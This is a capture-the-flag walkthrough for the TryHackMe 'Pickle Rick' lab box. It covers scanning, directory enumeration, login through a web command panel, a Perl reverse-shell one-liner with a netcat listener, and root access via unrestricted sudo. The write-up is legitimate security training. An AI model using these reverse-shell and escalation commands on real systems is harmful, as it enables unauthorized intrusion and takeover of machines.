---
title: "Pickle Rick"
date: 2020-07-26
layout: "writeup"
difficulty: "Easy"
excerpt: "Walkthrough for Pickle Rick on TryHackme"
os: "Linux"
platform: "TryHackMe"
tags: [Pickle Rick, TryHackme]
comments: false
---

Pickle Rick is an easy rated difficulty box on [TryHackMe](https://www.tryhackme.com). Below are the steps taken to root this box.

First, I enumerated the open TCP ports with `threader3000`.

![Pickle Rick threader3000](/images/PickleRick1.png)

Next, I enumerated the ports with `nmap -A -p 22,80 [machine ip]`.

![Pickle Rick nmap](/images/PickleRick2.png)

It appears there is a website running on port 80. I visited the site to see what I could find.

![Pickle Rick website](/images/PickleRick3.png)

It appears you are looking for ingredients for a recipe, and need to log into the victim computer to find them. Let's look at the source code of this page. The bolded words of **BURP** are probably a hint that burp suite is needed.

![Pickle Rick Source Code username](/images/PickleRick4.png)

This appears to be a username for something, so let's make a note of it for now. Next, let's enumerate the site with gobuster and see if we can find anything else on this site. The command I ran was `gobuster dir -u http://[machine ip] -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x .php,.txt -t 50`

![Pickle Rick gobuster](/images/PickleRick5.png)

We find a few different files/folders. **/assets** contained a couple of javascript files and a few images that we will come back to. The **robots.txt** contains a single word in it.

![Pickle Rick robots.txt](/images/PickleRick6.png)

Let's take a look at **/login.php** (**/portal.php** redirects to **/login.php** as well). It asks for a set of credentials. Let's try the username and potential passwords we uncovered previously.

![Pickle Rick portal.php](/images/PickleRick7.png)

We were able to login successfully and now have a command panel.

![Pickle Rick Command Panel](/images/PickleRick8.png)

Let's run `whoami` and see what happens.

![Pickle Rick Command Panel 2](/images/PickleRick9.png)

It appears we can execute shell commands, let's open up a netcat listener on our attacker pc with `nc -nvlp 4444`

![Pickle Rick nc listener](/images/PickleRick10.png)

Next, lets try entering reverse shell one liners ([found here](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)) until we find one that works. The perl one seemed to work with `perl -e 'use Socket;$i="[attacker ip]";$p=[attacker port];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`.

![Pickle Rick perl reverse shell](/images/PickleRick11.png)

We should now have a reverse shell established on our attacker PC. Running `whoami` lets you know you're running as `www-data`, and there is a file here that appears to contain the first ingredient.

![Pickle Rick www-data shell](/images/PickleRick12.png)

 Let's run `cat Sup3rS3cretPickl3Ingred.txt` and see what is there.

![Pickle Rick 1st ingredient](/images/PickleRick13.png)

This is the answer to the first flag. There is another text file present, lets look at it with `cat clue.txt`.

![Pickle Rick clue.txt](/images/PickleRick14.png)

Let's take this clue's advise and run `find / -name "second*" 2>/dev/null`. This will return the location of the 2nd ingredient file.

![Pickle Rick 2nd ingredient location](/images/PickleRick15.png)

Let's run `cat` on the file directory/name above in quotes and see what happens:

![Pickle Rick 2nd clue](/images/PickleRick16.png)

Success, this is the 2nd clue. Let's run `sudo -l` and see if www-data has any privileges we can run as another user.

![Pickle Rick sudo -l](/images/PickleRick17.png)

We can run any command as any user. Before we can swap users to root, we need to upgrade our shell. Let's run `python3 -c 'import pty; pty.spawn("/bin/sh")'`.

![Pickle Rick shell upgrade python3](/images/PickleRick18.png)

Let's run `sudo su` to switch to root and then `cd /root` followed by `ls -al` to see what's in root's home folder. There's a file called **3rd.txt**. Let's run `cat 3rd.txt` to get the 3rd flag and finish this box.

![Pickle Rick 3rd ingredient](/images/PickleRick19.png)

